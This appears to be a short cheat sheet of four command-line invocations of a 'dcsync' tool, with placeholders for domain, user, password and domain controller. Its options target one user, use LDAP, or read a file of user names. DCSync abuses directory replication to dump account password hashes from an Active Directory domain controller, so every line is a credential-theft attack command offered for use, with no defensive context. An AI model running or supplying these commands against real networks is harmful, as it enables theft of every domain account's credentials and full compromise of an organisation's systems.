dcsync $DOMAIN/$USER:"$PASSWORD"@$DC
dcsync -just-user Aether -k $DOMAIN/$USER:"$PASSWORD"@$DC
dcsync -method ldap $DOMAIN/$USER:"$PASSWORD"@$DC
dcsync -usersfile ./usersfile.txt -dc-ip $DC_IP $DOMAIN/$USER:"$PASSWORD"
